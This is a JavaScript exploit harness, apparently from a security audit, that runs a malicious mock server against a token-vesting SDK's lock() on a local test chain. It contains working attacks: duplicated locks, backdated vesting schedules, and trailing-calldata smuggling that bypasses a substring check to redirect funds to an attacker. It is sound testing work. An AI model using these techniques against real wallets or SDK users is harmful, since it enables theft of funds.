// ROUND 13 — Team A: SDK lock() residuals vs the CURRENT SDK verbatim
// (sha 3c1319e1…, live-api-round13-a — byte-identical to baseline).
// Fresh Anvil 4663 + MockERC20/MockLocker. Throwaway local keys only.
// No live POSTs, no real funds.
//
// K-711 P1: double createLock — lock() has NO step-count / sum check
//   (unlike agree()/deal(), which count createAgreement steps). Server
//   returns approve+createLock TWICE; victim asked to lock 500 for the
//   employee, ends up locking 1000. lock() returns an id with NO error.
// K-711 P2: same duplication, first lock immediately-vested (cliff 0,
//   end now) — employee claims the extra 500 AT ONCE.
// K-735 P3: backdated start — lock() checks the schedule only RELATIVELY
//   (cliff-start, end-start, step). Server backdates start by 455 days:
//   cliff-start = 90d and end-start = 365d still pass, but the lock is
//   ALREADY fully vested at creation; employee claims all 500 at once.
//   Victim asked cliffDays 90 / durationDays 365, never passed startAt
//   (the SDK's own doc example passes no startAt).
// K-712 P4: trailing-data smuggle — lock()'s pre-check is substring-based
//   (d.includes(hex(token)) && d.includes(hex(beneficiary))). Server puts
//   the ATTACKER as the real beneficiary arg and smuggles the victim's
//   beneficiary hex as trailing calldata (lockers ABI-decode fixed args
//   and ignore trailing bytes — forge-proven round 13). Pre-check passes,
//   lock is created for the attacker; lock() only throws AFTER the tx
//   (B-18's mechanism survives the patch — NOTE, not a new PASS).
// C0: honest single lock succeeds and is NOT claimable before the cliff.
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  createPublicClient, createWalletClient, http as vhttp, defineChain,
  parseAbi, encodeFunctionData, parseUnits, erc20Abi,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { Bull } from "./sdk-live.mjs";

const ROOT = path.dirname(fileURLToPath(import.meta.url));
const RPC = "http://127.0.0.1:8547";
const API_PORT = 3009;
const ZERO = "0x0000000000000000000000000000000000000000";

const chain = defineChain({ id: 4663, name: "Robinhood Chain",
  nativeCurrency: { decimals: 18, name: "ETH", symbol: "ETH" },
  rpcUrls: { default: { http: [RPC] } } });
const victimKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
const employeeKey = "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a";
const victim = privateKeyToAccount(victimKey);
const employee = privateKeyToAccount(employeeKey);
const V = victim.address, E = employee.address;
const ATTACKER = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8";

const publicClient = createPublicClient({ chain, transport: vhttp(RPC) });
const walletV = createWalletClient({ chain, transport: vhttp(RPC), account: victim });
const walletE = createWalletClient({ chain, transport: vhttp(RPC), account: employee });
const now = async () => Number((await publicClient.getBlock()).timestamp);

const LOCKER_ABI = parseAbi([
  "function createLock(address token,uint256 amount,address beneficiary,uint64 start,uint64 cliff,uint64 end,uint64 step) returns (uint256)",
  "function claim(uint256 id)",
  "function claimable(uint256 id) view returns (uint256)",
  "function getLock(uint256 id) view returns (address token,address beneficiary,uint256 amount,uint64 start,uint64 cliff,uint64 end,uint64 step)",
  "function nextId() view returns (uint256)",
]);
const approveCall = (spender, amt) => encodeFunctionData({ abi: erc20Abi, functionName: "approve", args: [spender, amt] });
const tx = (to, data, value = "0") => ({ to, data, value });
const bal = (token, who) => publicClient.readContract({ address: token, abi: erc20Abi, functionName: "balanceOf", args: [who] });
const lockCount = async (locker) => Number(await publicClient.readContract({ address: locker, abi: LOCKER_ABI, functionName: "nextId" })) - 1;

async function rpc(method, params) {
  const r = await fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
  const j = await r.json(); if (j.error) throw new Error(method + ": " + JSON.stringify(j.error)); return j.result;
}

let TOKEN, LOCKER;
const current = { mode: "honest" };
const server = http.createServer(async (req, res) => {
  const body = await new Promise((r) => { let d = ""; req.on("data", (c) => (d += c)); req.on("end", () => r(d)); });
  const send = (o) => { res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify(o)); };
  const t = await now();
  const amt = parseUnits("500", 18);
  const lockData = (beneficiary, start, cliff, end) => encodeFunctionData({ abi: LOCKER_ABI, functionName: "createLock",
    args: [TOKEN, amt, beneficiary, BigInt(start), BigInt(cliff), BigInt(end), 0n] });
  if (req.url === "/api/v1/vesting" && req.method === "POST") {
    if (current.mode === "double") {
      // K-711 P1: two identical legitimate-looking locks, same beneficiary.
      const d = lockData(E, t, t, t + 30 * 86400);
      return send({ steps: [
        { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
        { transaction: tx(LOCKER, d) },
        { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
        { transaction: tx(LOCKER, d) },
      ] });
    }
    if (current.mode === "double-immediate") {
      // K-711 P2: first lock fully vested at once, second on schedule.
      const dFast = lockData(E, t, t, t);
      const dSlow = lockData(E, t, t, t + 30 * 86400);
      return send({ steps: [
        { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
        { transaction: tx(LOCKER, dFast) },
        { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
        { transaction: tx(LOCKER, dSlow) },
      ] });
    }
    if (current.mode === "backdated") {
      // K-735 P3: start 455 days ago; cliff-start = 90d, end-start = 365d
      // (relative checks pass) but now >= end: fully vested immediately.
      const start = t - 455 * 86400;
      const d = lockData(E, start, start + 90 * 86400, start + 365 * 86400);
      return send({ steps: [
        { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
        { transaction: tx(LOCKER, d) },
      ] });
    }
    if (current.mode === "trailing") {
      // K-712 P4: real beneficiary = ATTACKER; victim hex smuggled trailing.
      const d = lockData(ATTACKER, t, t, t + 30 * 86400);
      const smuggled = d + "000000000000000000000000" + V.slice(2).toLowerCase();
      return send({ steps: [
        { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
        { transaction: tx(LOCKER, smuggled) },
      ] });
    }
    // honest
    const d = lockData(E, t, t + 90 * 86400, t + 365 * 86400);
    return send({ steps: [
      { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
      { transaction: tx(LOCKER, d) },
    ] });
  }
  res.writeHead(404); res.end("{}");
});

async function main() {
  await new Promise((r) => server.listen(API_PORT, r));
  const mocks = JSON.parse(fs.readFileSync(path.join(ROOT, "chain/out/Mocks.sol/MockERC20.json"), "utf8"));
  const lockerJson = JSON.parse(fs.readFileSync(path.join(ROOT, "chain/out/Mocks.sol/MockLocker.json"), "utf8"));
  const hash = await walletV.deployContract({ abi: mocks.abi, bytecode: mocks.bytecode.object, args: [] });
  TOKEN = (await publicClient.waitForTransactionReceipt({ hash })).contractAddress;
  const lh = await walletV.deployContract({ abi: lockerJson.abi, bytecode: lockerJson.bytecode.object, args: [] });
  LOCKER = (await publicClient.waitForTransactionReceipt({ hash: lh })).contractAddress;
  await walletV.writeContract({ address: TOKEN, abi: mocks.abi, functionName: "mint", args: [V, 100000n * 10n ** 18n] });

  const bull = new Bull({ walletClient: walletV, publicClient, baseUrl: `http://127.0.0.1:${API_PORT}` });
  const lockParams = { token: TOKEN, amount: "500", beneficiary: E, cliffDays: 0, durationDays: 30, stepDays: 0, locker: LOCKER };
  const results = [];

  // ---- K-711 P1: double createLock ----
  try {
    current.mode = "double";
    const vicBefore = await bal(TOKEN, V);
    const nBefore = await lockCount(LOCKER);
    const id = await bull.lock(lockParams);
    const vicAfter = await bal(TOKEN, V);
    const nAfter = await lockCount(LOCKER);
    const exploited = (vicBefore - vicAfter === parseUnits("1000", 18)) && (nAfter - nBefore === 2);
    results.push({ case: "K-711 P1 double createLock", exploited, lockIdReturned: String(id),
      detail: `lock() returned id ${id} with NO error; victim ${vicBefore}->${vicAfter} (-1000, asked 500); locks ${nBefore}->${nAfter}` });
    console.log("[K-711 P1] exploited:", exploited, "locks:", nBefore, "->", nAfter);
  } catch (e) {
    results.push({ case: "K-711 P1 double createLock", exploited: false, detail: "lock() threw: " + String(e.message || e).slice(0, 200) });
    console.log("[K-711 P1] threw:", String(e.message || e).slice(0, 150));
  }

  // ---- K-711 P2: double lock, first immediately claimable ----
  try {
    current.mode = "double-immediate";
    const id = await bull.lock(lockParams);
    const n = await lockCount(LOCKER);
    // The fast lock is id n-1 (second-to-last created); claim it as employee.
    const fastId = BigInt(n - 1);
    const claimable = await publicClient.readContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "claimable", args: [fastId] });
    const empBefore = await bal(TOKEN, E);
    await walletE.writeContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "claim", args: [fastId] });
    const empAfter = await bal(TOKEN, E);
    const exploited = claimable === parseUnits("500", 18) && empAfter - empBefore === parseUnits("500", 18);
    results.push({ case: "K-711 P2 double lock, first immediately claimable", exploited, lockIdReturned: String(id),
      detail: `lock() returned id ${id} with NO error; fast lock claimable ${claimable}; employee claimed +${empAfter - empBefore}` });
    console.log("[K-711 P2] exploited:", exploited, "employee claimed:", (empAfter - empBefore).toString());
  } catch (e) {
    results.push({ case: "K-711 P2 double lock, first immediately claimable", exploited: false, detail: "threw: " + String(e.message || e).slice(0, 200) });
    console.log("[K-711 P2] threw:", String(e.message || e).slice(0, 150));
  }

  // ---- K-735 P3: backdated start ----
  try {
    current.mode = "backdated";
    const params = { token: TOKEN, amount: "500", beneficiary: E, cliffDays: 90, durationDays: 365, stepDays: 0, locker: LOCKER };
    const id = await bull.lock(params);
    const claimable = await publicClient.readContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "claimable", args: [BigInt(id)] });
    const empBefore = await bal(TOKEN, E);
    await walletE.writeContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "claim", args: [BigInt(id)] });
    const empAfter = await bal(TOKEN, E);
    const exploited = claimable === parseUnits("500", 18) && empAfter - empBefore === parseUnits("500", 18);
    results.push({ case: "K-735 P3 backdated start (cliff 90d/duration 365d asked)", exploited, lockIdReturned: String(id),
      detail: `lock() returned id ${id} with NO error; claimable at once ${claimable}; employee claimed +${empAfter - empBefore} immediately (asked cliff 90d)` });
    console.log("[K-735 P3] exploited:", exploited, "employee claimed:", (empAfter - empBefore).toString());
  } catch (e) {
    results.push({ case: "K-735 P3 backdated start", exploited: false, detail: "lock() threw: " + String(e.message || e).slice(0, 200) });
    console.log("[K-735 P3] threw:", String(e.message || e).slice(0, 150));
  }

  // ---- K-712 P4: trailing-data smuggle (B-18 survives patch?) ----
  try {
    current.mode = "trailing";
    const params = { token: TOKEN, amount: "500", beneficiary: V, cliffDays: 0, durationDays: 30, stepDays: 0, locker: LOCKER };
    const vicBefore = await bal(TOKEN, V);
    const id = await bull.lock(params);
    const vicAfter = await bal(TOKEN, V);
    results.push({ case: "K-712 P4 trailing-data smuggle", exploited: false,
      detail: `lock() returned id ${id} with NO error (unexpected); victim ${vicBefore}->${vicAfter}` });
    console.log("[K-712 P4] lock() returned", id, "— no throw at all");
  } catch (e) {
    const msg = String(e.message || e);
    const n = await lockCount(LOCKER);
    const last = await publicClient.readContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "getLock", args: [BigInt(n)] });
    const createdForAttacker = last[1].toLowerCase() === ATTACKER.toLowerCase();
    results.push({ case: "K-712 P4 trailing-data smuggle", exploited: createdForAttacker,
      detail: `lock() threw POST-tx: "${msg.slice(0, 120)}" — but lock ${n} WAS created for the attacker (beneficiary=${last[1]}); pre-check bypassed, B-18 mechanism survives` });
    console.log("[K-712 P4] threw post-tx:", msg.slice(0, 100), "| lock created for attacker:", createdForAttacker);
  }

  // ---- C0: honest lock ----
  try {
    current.mode = "honest";
    const params = { token: TOKEN, amount: "500", beneficiary: E, cliffDays: 90, durationDays: 365, stepDays: 0, locker: LOCKER };
    const vicBefore = await bal(TOKEN, V);
    const id = await bull.lock(params);
    const vicAfter = await bal(TOKEN, V);
    const claimable = await publicClient.readContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "claimable", args: [BigInt(id)] });
    const ok = vicBefore - vicAfter === parseUnits("500", 18) && claimable === 0n;
    results.push({ case: "C0 honest lock succeeds, not claimable before cliff", ok,
      detail: `lock() returned id ${id}; victim -500 exactly; claimable ${claimable}` });
    console.log("[C0] ok:", ok, "claimable:", claimable.toString());
  } catch (e) {
    results.push({ case: "C0 honest lock succeeds", ok: false, detail: "threw: " + String(e.message || e).slice(0, 200) });
    console.log("[C0] threw:", String(e.message || e).slice(0, 150));
  }

  console.log(JSON.stringify(results, null, 2));
  const exploited = results.filter((r) => r.exploited).length;
  const controlsOk = results.filter((r) => r.ok).length;
  console.log(`EXPLOITED: ${exploited}/4 (K-711 P1, K-711 P2, K-735 P3, K-712 P4) | CONTROLS OK: ${controlsOk}/1`);
  server.close();
  process.exit(exploited === 4 && controlsOk === 1 ? 0 : 1);
}
main().catch((e) => { console.error("RUNNER FATAL", e); server.close(); process.exit(2); });
